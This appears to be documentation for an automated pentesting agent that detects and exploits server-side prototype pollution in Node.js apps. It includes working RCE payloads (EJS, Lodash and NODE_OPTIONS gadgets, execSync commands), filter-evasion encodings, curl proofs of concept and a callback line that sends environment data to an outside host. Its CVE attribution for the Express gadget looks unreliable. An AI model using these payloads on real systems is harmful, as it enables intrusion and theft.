# PrototypePollutionAgent Documentation

## Overview

PrototypePollutionAgent is a specialized security testing agent that detects and exploits Prototype Pollution vulnerabilities (CWE-1321) in JavaScript/Node.js applications. It uses a two-phase Hunter-Auditor pattern to discover pollution vectors and escalate exploitation through four tiers: basic pollution detection, encoding bypasses, gadget chain discovery, and RCE proof-of-concept.

The agent targets server-side prototype pollution, a critical vulnerability class that can lead to authentication bypasses, privilege escalation, DoS, and in severe cases, Remote Code Execution via Node.js-specific exploitation techniques.

## Vulnerability Description

Prototype Pollution occurs when an attacker can inject properties into JavaScript object prototypes (`Object.prototype`, `Array.prototype`, etc.). Since JavaScript's prototypal inheritance means all objects inherit from `Object.prototype`, polluting this base prototype affects the entire application.

**Attack Impact:**

- **Privilege Escalation**: Pollute `isAdmin`, `role`, or `permissions` properties
- **Authentication Bypass**: Inject authentication flags that applications check globally
- **Denial of Service**: Pollute properties that crash application logic
- **Remote Code Execution**: Exploit Node.js-specific gadgets (`NODE_OPTIONS`, `child_process` spawning)
- **Security Control Bypass**: Override security checks via polluted properties

**CWE Reference:** [CWE-1321: Improperly Controlled Modification of Object Prototype Attributes](https://cwe.mitre.org/data/definitions/1321.html)

**Default Severity:** HIGH (escalates to CRITICAL when RCE is confirmed)

## Architecture

### Hunter-Auditor Pattern

```
┌────────────────────────────────────────────────────────────┐
│                 PrototypePollutionAgent                     │
│                                                              │
│  ┌─────────────────┐       ┌──────────────────────┐        │
│  │  Hunter Phase   │ ──▶  │   Auditor Phase      │        │
│  │                 │       │                      │        │
│  │ - JSON vectors  │       │ - Tier 1: Pollution  │        │
│  │ - Query params  │       │ - Tier 2: Encoding   │        │
│  │ - POST body     │       │ - Tier 3: Gadgets    │        │
│  │ - Code patterns │       │ - Tier 4: RCE        │        │
│  │ - Error hints   │       │                      │        │
│  └─────────────────┘       └──────────────────────┘        │
│                                     │                       │
│                                     ▼                       │
│                            ┌──────────────────┐            │
│                            │    Findings      │            │
│                            │  (validated +    │            │
│                            │   severity)      │            │
│                            └──────────────────┘            │
└────────────────────────────────────────────────────────────┘
```

### Phase 1: Hunter (Discovery)

The Hunter phase scans for potential pollution vectors across four attack surfaces:

| Vector Type | Detection Method | Example |
|-------------|------------------|---------|
| JSON Body | Check if endpoint accepts JSON POST/PUT | `Content-Type: application/json` |
| Query Parameters | Detect deep parsing libraries (qs, querystring) | `?__proto__[polluted]=true` |
| Vulnerable Patterns | Parse error messages for merge/assign operations | `Object.assign(target, input)` |
| Framework Detection | Identify Express, Lodash, jQuery patterns | `express.json()`, `_.merge()` |

**Discovery Process:**

1. **Accept Headers Analysis**: Send requests with JSON Content-Type to detect body parsing
2. **Query Parameter Probing**: Test nested parameter syntax (`param[key][subkey]=value`)
3. **Error Message Parsing**: Trigger errors to reveal vulnerable code patterns
4. **Framework Fingerprinting**: Detect Express version, Lodash usage from headers/responses

**Confidence Scoring:**

Vectors are prioritized by confidence level:

- **HIGH**: Accepts JSON body + error reveals `Object.assign` or `merge`
- **MEDIUM**: Accepts JSON body OR nested query params work
- **LOW**: Framework detected but no direct evidence of vulnerable merge

### Phase 2: Auditor (Validation)

The Auditor phase tests discovered vectors through four escalating tiers:

| Tier | Name | Severity | Success Rate | Technique |
|------|------|----------|--------------|-----------|
| 1 | Pollution Detection | LOW | ~70% | Basic `__proto__` or `constructor.prototype` injection |
| 2 | Encoding Bypass | MEDIUM | ~40% | WAF evasion via obfuscation, URL encoding, Unicode |
| 3 | Gadget Chain | HIGH | ~20% | Framework-specific exploitation (Express, EJS, Lodash) |
| 4 | RCE Exploitation | CRITICAL | ~5% | `NODE_OPTIONS` injection, timing attacks, command output |

**Validation Approach:**

- **Tier 1**: Send pollution payload, check if property appears in subsequent response or error
- **Tier 2**: Test encoding variations to bypass filters (nested `__pro__proto__to__`, Unicode)
- **Tier 3**: Exploit known framework gadgets (Express `json spaces`, EJS `escapeFunction`)
- **Tier 4**: Attempt RCE via `NODE_OPTIONS` with timing validation (5-second delay) or command output detection

**Ranked Payloads:**

The agent stops testing on first successful tier. If Tier 1 succeeds, it attempts Tier 2; if Tier 2 fails, it reports Tier 1 success and stops.

## Supported Pollution Vectors

### 1. JSON Body (POST/PUT/PATCH) - Primary Vector

Most server-side prototype pollution occurs through JSON body parsing with vulnerable merge operations:

**Common Vulnerable Code:**

```javascript
// Express.js with body-parser
app.use(express.json());
app.post('/api/config', (req, res) => {
    Object.assign(config, req.body);  // VULNERABLE
});

// Lodash merge
const settings = {};
app.post('/settings', (req, res) => {
    _.merge(settings, req.body);  // VULNERABLE
});
```

**Agent Detection:**

- Sends `Content-Type: application/json` requests
- Tests if server accepts JSON payloads
- Attempts pollution via `__proto__` or `constructor.prototype`

### 2. Query Parameters (GET)

Vulnerable query string parsing libraries allow nested key injection:

**Vulnerable Libraries:**

- `qs` (older versions)
- `querystring` (Node.js built-in, some configurations)
- Custom parsers without prototype guards

**Example Vulnerable Parsing:**

```javascript
const qs = require('qs');
const parsed = qs.parse(req.query);  // VULNERABLE if no options
// Query: ?__proto__[polluted]=true
// Result: Object.prototype.polluted = "true"
```

**Agent Payloads:**

```
?__proto__[polluted]=bugtrace_marker_12345
?__proto__.polluted=bugtrace_marker_12345
?constructor[prototype][polluted]=bugtrace_marker_12345
```

### 3. Vulnerable Code Pattern Detection

The agent analyzes error messages and responses for indicators:

**High-Risk Patterns:**

```javascript
Object.assign(target, userInput)
_.merge(target, userInput)
$.extend(true, target, userInput)
clone(userInput)  // deep clone without guards
```

**Detection Techniques:**

- Trigger errors with invalid JSON to expose stack traces
- Look for function names like `assign`, `merge`, `extend`, `clone`
- Check for library names in error messages (lodash, jquery, minimist)

### 4. Framework-Specific Vectors

**Express.js:**

- `express.json()` middleware accepts JSON bodies
- Older versions lack prototype pollution protection
- Express < 4.17.4 vulnerable to `json spaces` gadget

**Lodash:**

- `_.merge()`, `_.defaultsDeep()` susceptible before version 4.17.21
- Agent detects Lodash via `X-Powered-By` header or error messages

**Minimist:**

- Command-line parser vulnerable to pollution via `--__proto__.polluted=true`
- Less common in web apps but present in CLI tools exposed via APIs

## Payload Library

### Tier 1: Basic Pollution Detection

**Goal:** Confirm prototype pollution exists

```json
// Standard __proto__ payload
{
  "__proto__": {
    "polluted": "bugtrace_marker_12345"
  }
}

// Constructor.prototype (bypasses basic __proto__ filter)
{
  "constructor": {
    "prototype": {
      "polluted": "bugtrace_marker_12345"
    }
  }
}
```

**Validation:**

- Send payload via JSON body or query param
- Make subsequent request to same endpoint
- Check if `polluted` property appears in response, error message, or header

**Why it works:**

After pollution, all objects inherit the property:

```javascript
const obj = {};
console.log(obj.polluted);  // "bugtrace_marker_12345"
```

### Tier 2: Encoding Bypass

**Goal:** Evade WAFs and input filters

```json
// Nested obfuscation (bypasses string.replace("__proto__"))
{
  "__pro__proto__to__": {
    "polluted": "bugtrace_marker_12345"
  }
}

// Unicode escape sequences
{
  "\u005F\u005Fproto\u005F\u005F": {
    "polluted": "bugtrace_marker_12345"
  }
}

// Mixed constructor/prototype (bypasses blacklist checks)
{
  "constructor": {
    "prototype": {
      "polluted": "bugtrace_marker_12345"
    }
  }
}
```

**Query Parameter Encoding:**

```
# URL encoding
?%5F%5Fproto%5F%5F[polluted]=bugtrace_marker_12345

# Double encoding (for double-decoding systems)
?%255F%255Fproto%255F%255F[polluted]=bugtrace_marker_12345

# Unicode normalization bypass
?__proto__[pоlluted]=bugtrace_marker_12345  # Cyrillic 'o'
```

**Why it works:**

Many filters use simple string matching:

```javascript
// Vulnerable filter
if (key.includes("__proto__")) {
    delete obj[key];
}
// Bypassed by: "__pro__proto__to__" which becomes "__proto__" after first replace
```

### Tier 3: Gadget Chain Exploitation

**Goal:** Leverage framework-specific behaviors for higher impact

#### Express.js JSON Spaces (CVE-2022-29078, Express < 4.17.4)

```json
{
  "__proto__": {
    "json spaces": 10
  }
}
```

**Validation:**

- Send payload
- Make request to endpoint returning JSON
- Check if response has 10-space indentation (normally 0 or 2)

**Why it works:**

Express checks `app.get('json spaces')` which reads from global config. Polluted `json spaces` overrides this setting.

#### EJS Template Engine RCE (EJS < 3.1.7)

```json
{
  "__proto__": {
    "client": 1,
    "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').execSync('whoami')"
  }
}
```

**Validation:**

- Send payload
- Trigger EJS template rendering
- Check for command output (`root`, `www-data`, `ubuntu`) in response

**Why it works:**

EJS reads `options.escapeFunction` which falls back to prototype. Attacker-controlled `escapeFunction` executes as JavaScript code during template compilation.

#### Lodash Template SourceURL (Lodash < 4.17.21)

```json
{
  "__proto__": {
    "sourceURL": "\nprocess.mainModule.require('child_process').execSync('whoami')//"
  }
}
```

**Why it works:**

Lodash template compilation uses `sourceURL` for debugging. Injecting code before comment (`//`) causes execution during compilation.

### Tier 4: RCE Exploitation

**Goal:** Prove Remote Code Execution

#### Technique 1: NODE_OPTIONS Timing Attack (Blind RCE)

```json
{
  "__proto__": {
    "env": {
      "EVIL": "require('child_process').execSync('sleep 5')"
    },
    "NODE_OPTIONS": "--require /proc/self/environ"
  }
}
```

**Validation:**

- Send payload
- Measure response time
- If response time >= 4.5 seconds → RCE confirmed

**Why it works:**

1. Pollute `Object.prototype.env` with malicious code
2. Pollute `Object.prototype.NODE_OPTIONS` to load environment as module
3. When app spawns child process (via `child_process.spawn()`, `fork()`, etc.):
   - Child inherits `NODE_OPTIONS` from prototype
   - Node.js executes `--require /proc/self/environ`
   - `/proc/self/environ` contains `EVIL` variable which executes `sleep 5`

**Critical Dependencies:**

- Application must spawn child processes after pollution
- Linux/Unix environment (`/proc/self/environ` exists)
- Node.js version < 20 (v20+ has better prototype guards)

#### Technique 2: Command Output (Visible RCE)

```json
{
  "__proto__": {
    "env": {
      "EVIL": "console.log(require('child_process').execSync('id').toString())"
    },
    "NODE_OPTIONS": "--require /proc/self/environ"
  }
}
```

**Validation:**

- Send payload
- Check response body for command output patterns:
  - `uid=`, `gid=` (from `id` command)
  - `root`, `www-data`, `ubuntu` (from `whoami`)
  - `/etc/passwd` contents (from `cat /etc/passwd`)

**Why it works:**

Same as timing attack, but uses `console.log()` to write command output to application logs/stdout, which may appear in HTTP response.

#### Technique 3: Data URI Import (Node.js >= 19)

```json
{
  "__proto__": {
    "NODE_OPTIONS": "--import data:text/javascript;base64,Y29uc29sZS5sb2cocmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCd3aG9hbWknKS50b1N0cmluZygpKQ=="
  }
}
```

**Base64 decodes to:**

```javascript
console.log(require('child_process').execSync('whoami').toString())
```

**Validation:**

- Send payload
- Check for command output in response

**Why it works:**

Node.js 19+ supports `--import` with data URIs. This bypasses file system restrictions by encoding malicious code directly in the command line argument.

**Advantages over /proc/self/environ:**

- Works on Windows (no `/proc` dependency)
- Doesn't require writing to filesystem
- More reliable on containerized environments

## Usage

### As Part of Scan Pipeline

PrototypePollutionAgent runs automatically when vulnerabilities are detected:

```bash
# Full scan includes PrototypePollutionAgent
bugtrace scan http://target.com/api

# Focused audit mode
bugtrace audit http://target.com/api/config --agents prototype_pollution
```

**Automatic Dispatch:**

The agent is invoked when:

- DAST analyzer detects JSON body acceptance
- LLM dispatcher identifies keywords: `PROTOTYPE`, `POLLUTION`, `__PROTO__`
- TeamOrchestrator fast-path detects prototype pollution patterns
- Manual agent specification via `--agents` flag

**TeamOrchestrator Fast-Path:**

```python
# Automatic fast-path routing
keywords = ["PROTOTYPE", "POLLUTION", "__PROTO__", "CONSTRUCTOR"]
if any(kw in vulnerability_description.upper() for kw in keywords):
    return "prototype_pollution"  # Dispatch PrototypePollutionAgent
```

### Standalone Usage

```python
from bugtrace.agents.prototype_pollution_agent import PrototypePollutionAgent
from pathlib import Path
import asyncio

async def test_prototype_pollution():
    # Initialize agent
    agent = PrototypePollutionAgent(
        url="http://target.com/api/config",
        params=["config", "settings"],  # Additional JSON keys to test
        report_dir=Path("./reports")
    )

    # Run agent
    result = await agent.run_loop()

    # Check results
    if result["vulnerable"]:
        print(f"Found {result['findings_count']} vulnerabilities")
        for finding in result["findings"]:
            print(f"  Type: {finding['type']}")
            print(f"  Severity: {finding['severity']}")
            print(f"  Tier: {finding.get('exploitation_tier', 'N/A')}")
            print(f"  Payload: {finding['payload']}")
            if finding['severity'] == 'CRITICAL':
                print(f"  RCE Evidence: {finding.get('rce_evidence')}")
    else:
        print("No vulnerabilities found")

asyncio.run(test_prototype_pollution())
```

### Advanced Usage - Tier-Specific Testing

```python
from bugtrace.agents.prototype_pollution_agent import PrototypePollutionAgent
from bugtrace.agents.prototype_pollution_payloads import (
    get_pollution_detection_payloads,
    get_encoding_bypass_payloads,
    get_gadget_payloads,
    get_rce_payloads
)

async def test_specific_tier():
    agent = PrototypePollutionAgent(
        url="http://target.com/api/settings",
        params=["userSettings"]
    )

    # Test only specific exploitation tier
    payloads = get_rce_payloads()  # Only RCE payloads
    print(f"Testing {len(payloads)} RCE payloads")

    # Run full test
    result = await agent.run_loop()

    # Analyze by tier
    for finding in result["findings"]:
        tier = finding.get("exploitation_tier", "unknown")
        print(f"Success with tier: {tier}")
        print(f"Severity escalated to: {finding['severity']}")
```

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `PROTOTYPE_POLLUTION_TIMEOUT` | HTTP request timeout (seconds) | 10 |
| `BUGTRACE_CALLBACK_DOMAIN` | Callback domain for OOB validation (future) | None |
| `PP_MAX_TIER` | Maximum tier to test (1-4) | 4 |

### Agent Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `url` | str | Target URL to test (required) |
| `params` | List[str] | Additional parameters/keys to test beyond auto-discovery (optional) |
| `report_dir` | Path | Directory for report output (optional, default: `./reports`) |

### Configuration Example

```python
import os
os.environ['PROTOTYPE_POLLUTION_TIMEOUT'] = '15'
os.environ['PP_MAX_TIER'] = '3'  # Skip RCE testing (tier 4)

agent = PrototypePollutionAgent(
    url="http://target.com/api/user/update",
    params=["profile", "preferences", "settings"],  # Test these JSON keys
    report_dir=Path("/var/reports")
)
```

## Findings Format

PrototypePollutionAgent produces findings in the standardized BugTraceAI format:

### Example Finding (RCE Confirmed)

```json
{
  "type": "PROTOTYPE_POLLUTION",
  "severity": "CRITICAL",
  "url": "http://target.com/api/config",
  "parameter": null,
  "payload": "{\"__proto__\": {\"env\": {\"EVIL\": \"require('child_process').execSync('sleep 5')\"}, \"NODE_OPTIONS\": \"--require /proc/self/environ\"}}",
  "description": "Prototype Pollution via JSON_BODY - rce_exploitation exploitation",
  "validated": true,
  "status": "VALIDATED_CONFIRMED",
  "cwe_id": "CWE-1321",
  "exploitation_tier": "rce_exploitation",
  "rce_evidence": {
    "timing_delay": 5.23,
    "command_output": null
  },
  "vector_type": "JSON_BODY",
  "confidence": "HIGH",
  "reproduction": "curl -X POST http://target.com/api/config -H 'Content-Type: application/json' -d '{\"__proto__\": {\"env\": {\"EVIL\": \"...\"}}}'",
  "remediation": "To remediate Prototype Pollution vulnerabilities:\n1. Use `Object.create(null)` for objects that store user input\n2. Use Map instead of plain objects for key-value storage\n3. Validate and sanitize all user input before merging\n4. Update vulnerable libraries (Lodash >= 4.17.21, Express >= 4.17.4)\n5. Use `Object.freeze(Object.prototype)` as defense-in-depth",
  "http_request": "POST /api/config HTTP/1.1\nContent-Type: application/json\n\n{...}",
  "http_response": "HTTP/1.1 200 OK\n[Response delayed by 5.23 seconds]"
}
```

### Example Finding (Basic Pollution)

```json
{
  "type": "PROTOTYPE_POLLUTION",
  "severity": "LOW",
  "url": "http://target.com/api/config",
  "parameter": "config",
  "payload": "?__proto__[polluted]=bugtrace_marker_12345",
  "description": "Prototype Pollution via QUERY_PARAM - pollution_detection exploitation",
  "validated": true,
  "status": "VALIDATED_CONFIRMED",
  "cwe_id": "CWE-1321",
  "exploitation_tier": "pollution_detection",
  "vector_type": "QUERY_PARAM",
  "confidence": "MEDIUM",
  "reproduction": "curl 'http://target.com/api/config?__proto__[polluted]=bugtrace_marker_12345'"
}
```

**Finding Fields Explained:**

- **exploitation_tier**: Level of exploitation achieved (`pollution_detection`, `encoding_bypass`, `gadget_chain`, `rce_exploitation`)
- **rce_evidence**: Proof of RCE (timing delay or command output)
- **vector_type**: Attack surface used (`JSON_BODY`, `QUERY_PARAM`, `JS_PATTERN`)
- **confidence**: Hunter's confidence in vector viability (`HIGH`, `MEDIUM`, `LOW`)

### Severity Classification

| Tier | Exploitation Level | Severity |
|------|-------------------|----------|
| 1 | Pollution detected only | LOW |
| 2 | Encoding bypass works | MEDIUM |
| 3 | Gadget chain found | HIGH |
| 4 | RCE confirmed (timing/output) | CRITICAL |

## Exploitation Techniques Explained

### Why Prototype Pollution Works

JavaScript uses prototypal inheritance. Every object inherits from `Object.prototype`:

```javascript
const user = {name: "Alice"};
user.toString();  // Inherited from Object.prototype.toString
```

When an attacker pollutes `Object.prototype`:

```javascript
Object.prototype.isAdmin = true;
const user = {name: "Alice"};
console.log(user.isAdmin);  // true (inherited!)
```

**Vulnerable Merge Pattern:**

```javascript
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Attack
merge({}, JSON.parse('{"__proto__": {"polluted": true}}'));
// Result: Object.prototype.polluted = true
```

### Why NODE_OPTIONS RCE Works

Node.js respects the `NODE_OPTIONS` environment variable when spawning child processes:

```javascript
const { spawn } = require('child_process');
const child = spawn('node', ['script.js']);  // Reads NODE_OPTIONS from environment
```

**Attack Chain:**

1. Pollute `Object.prototype.NODE_OPTIONS`
2. Pollute `Object.prototype.env` with malicious code
3. Application spawns child process (e.g., for background job, PDF generation, image processing)
4. Child process constructor reads options: `{ NODE_OPTIONS: "--require /proc/self/environ" }`
5. Node.js loads `/proc/self/environ` as module
6. `/proc/self/environ` contains `EVIL=require('child_process').execSync('whoami')`
7. Code executes, RCE achieved

**Critical Insight:**

The `/proc/self/environ` file in Linux contains the process environment as null-separated strings. Node.js `--require` treats it as a module, executing any JavaScript code within.

### Why Data URI Import Works (Node.js >= 19)

Node.js 19+ supports ES module imports from data URIs:

```javascript
// Normal import
import('./module.js');

// Data URI import
import('data:text/javascript;base64,Y29uc29sZS5sb2coImhlbGxvIik=');
// Decodes to: console.log("hello")
```

**Attack Application:**

```json
{
  "__proto__": {
    "NODE_OPTIONS": "--import data:text/javascript;base64,<BASE64_PAYLOAD>"
  }
}
```

**Advantages:**

- No filesystem access required
- Works on Windows (no `/proc`)
- Bypasses file integrity monitoring
- More reliable in containerized environments

### Why Timing Attacks Work

`sleep 5` executed via RCE causes measurable delay:

```javascript
// Normal response: ~100ms
// RCE response: ~5100ms

if (response_time >= 4.5 seconds) {
    // RCE confirmed (allowing 0.5s margin for network latency)
}
```

**Why not use `ping` or DNS?**

- Requires callback server (Interactsh) - not yet integrated
- Timing attack works offline, no external infrastructure needed
- 5-second delay is unmistakable signal (network jitter typically < 1s)

### Why Gadget Chains Work

Framework-specific gadgets exploit unsafe property reads:

**Express JSON Spaces:**

```javascript
// express/lib/response.js
res.json = function(obj) {
    const spaces = this.app.get('json spaces');  // VULNERABLE
    return JSON.stringify(obj, null, spaces);
};
```

If `Object.prototype['json spaces']` is polluted, `this.app.get()` reads from prototype.

**EJS Escape Function:**

```javascript
// ejs/lib/ejs.js
function compile(template, opts) {
    const escapeFn = opts.escapeFunction || /* default */;  // VULNERABLE
    return Function('return ' + escapeFn + ';')();  // Code execution!
}
```

If `Object.prototype.escapeFunction` is polluted, attacker controls executed code.

## Limitations

### 1. Client-Side Pollution Not Covered

**Limitation:** This agent targets server-side (Node.js) prototype pollution. Client-side DOM-based pollution requires different detection methods.

**Example not detected:**

```javascript
// Client-side JavaScript on webpage
const params = new URLSearchParams(location.search);
window[params.get('key')] = params.get('value');  // DOM pollution
```

**Workaround:** Use browser-based security scanners for client-side detection.

### 2. Node.js Version Dependency

**Limitation:** Some exploitation techniques require specific Node.js versions:

- Data URI import: Node.js >= 19
- `/proc/self/environ` technique: Linux/Unix only
- Older Node.js versions have weaker prototype guards (easier exploitation)

**Impact:** Agent may produce false negatives on newer Node.js versions (>= 20) with enhanced prototype pollution protection.

### 3. Child Process Dependency for RCE

**Limitation:** RCE exploitation requires the application to spawn child processes after pollution.

**Example scenarios where RCE works:**

- PDF generation (using `puppeteer`, `wkhtmltopdf`)
- Image processing (using `imagemagick`, `sharp`)
- Background jobs (using `worker_threads`, `child_process.fork()`)
- Shell command execution (using `exec`, `spawn`)

**Example where RCE fails:**

- Pure API server with no child process spawning
- Application only uses synchronous JavaScript (no subprocess calls)

### 4. Framework Detection Limitations

**Limitation:** Agent does not automatically detect target framework. Gadget payloads may produce false negatives if framework doesn't match.

**Example:**

- Testing Express gadget on Fastify application → No exploitation
- Testing EJS gadget on Pug application → No exploitation

**Workaround:** Manual framework detection via headers, error messages, or separate reconnaissance phase.

### 5. No Callback Integration (Yet)

**Limitation:** Current version uses timing attacks for blind RCE proof. More reliable OOB (Out-of-Band) validation via DNS/HTTP callbacks planned but not implemented.

**Future Enhancement:**

```json
{
  "__proto__": {
    "env": {
      "EVIL": "require('https').get('http://your-id.interact.sh?data='+process.env.USER)"
    },
    "NODE_OPTIONS": "--require /proc/self/environ"
  }
}
```

## Safety Considerations

The agent strictly uses **read-only RCE commands** for ethical penetration testing:

**Allowed Commands:**

- `whoami` - Identify process user
- `id` - Show user ID and groups
- `hostname` - Show server hostname
- `uname -a` - Show OS information
- `cat /etc/passwd` - Read user list (no password hashes in modern systems)
- `sleep 5` - Timing proof (no side effects)

**NEVER Executed:**

- File modifications: `rm`, `chmod`, `chown`, `mv`, `cp`, `dd`
- File downloads: `wget -O`, `curl -o`
- Privilege escalation: `sudo`, `su`
- Persistence: cron jobs, systemd services, startup scripts
- Network attacks: port scanning, lateral movement

**Ethical Considerations:**

- Only test on systems you have authorization to test
- RCE payloads are proof-of-concept, not weaponized
- Timing attacks cause brief delay but no data modification
- No data exfiltration beyond command output validation

## Bug Bounty Reporting

When reporting prototype pollution findings:

### Low Severity (Tier 1: Pollution Detection)

**Report Template:**

```markdown
**Title:** Prototype Pollution in /api/config Endpoint

**Severity:** Low

**Description:**
The `/api/config` endpoint is vulnerable to prototype pollution via JSON body. By sending a crafted `__proto__` payload, I can inject arbitrary properties into `Object.prototype`, affecting all objects in the application.

**Proof of Concept:**
```bash
curl -X POST http://target.com/api/config \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "bugtrace_marker"}}'
```

**Evidence:**
Subsequent requests show the polluted property in responses or error messages.

**Impact:**
While pollution is confirmed, no privilege escalation or RCE exploitation was achieved. Potential impacts include DoS via property collision or authentication bypass if specific properties are checked.

**Remediation:**
Use `Object.create(null)` for user input storage or upgrade to Lodash >= 4.17.21.
```

### Critical Severity (Tier 4: RCE Exploitation)

**Report Template:**

```markdown
**Title:** Prototype Pollution Leading to Remote Code Execution in /api/config

**Severity:** Critical

**Description:**
The `/api/config` endpoint is vulnerable to prototype pollution that escalates to Remote Code Execution via `NODE_OPTIONS` injection. This allows arbitrary command execution on the server.

**Proof of Concept:**
```bash
curl -X POST http://target.com/api/config \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "env": {"EVIL": "require(\"child_process\").execSync(\"sleep 5\")"},
      "NODE_OPTIONS": "--require /proc/self/environ"
    }
  }'
```

**Evidence:**
- Normal response time: ~150ms
- Attack response time: ~5200ms (5-second delay confirms command execution)

**Impact:**
Remote Code Execution with the privileges of the Node.js process. Attacker can:
- Read sensitive files (`/etc/passwd`, application config)
- Execute arbitrary commands
- Pivot to other systems on the internal network
- Exfiltrate data via DNS/HTTP

**Remediation:**
1. Immediate: Use `Object.create(null)` for all user input handling
2. Update vulnerable libraries (Express >= 4.17.4, Lodash >= 4.17.21)
3. Implement `Object.freeze(Object.prototype)` as defense-in-depth
4. Add input validation to reject `__proto__`, `constructor`, `prototype` keys
```

## Related Documentation

- [BugTraceAI Agent Architecture](../architecture/agents.md)
- [Reporting Standards](../reporting/standards.md)
- [Payload Library Reference](../payloads/prototype-pollution-payloads.md)
- [OWASP Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)

## Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0.0 | 2026-01 | Initial release with Hunter-Auditor pattern, 4-tier exploitation, RCE gadgets |

## Research Sources

This agent implementation is based on:

- **PayloadsAllTheThings** - Prototype Pollution payload collection
- **HackTricks** - Prototype Pollution to RCE exploitation guide
- **KTH-LangSec Server-Side Prototype Pollution Research** - Academic research on Node.js gadgets
- **Silent Spring (USENIX Security 2023)** - Comprehensive study of server-side prototype pollution
- **Snyk Vulnerability Database** - Framework-specific gadget chains (Express, EJS, Lodash)
- **CVE-2022-29078** - Express.js JSON spaces exploitation
- **GitHub Advisory Database** - Historical prototype pollution vulnerabilities

## Technical References

- [CWE-1321: Improperly Controlled Modification of Object Prototype Attributes](https://cwe.mitre.org/data/definitions/1321.html)
- [Silent Spring: Prototype Pollution Leads to RCE](https://www.usenix.org/conference/usenixsecurity23/presentation/shcherbakov)
- [KTH-LangSec Research Repository](https://github.com/KTH-LangSec/server-side-prototype-pollution)
- [Snyk: Prototype Pollution Attack Vectors](https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/)
- [PortSwigger: Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
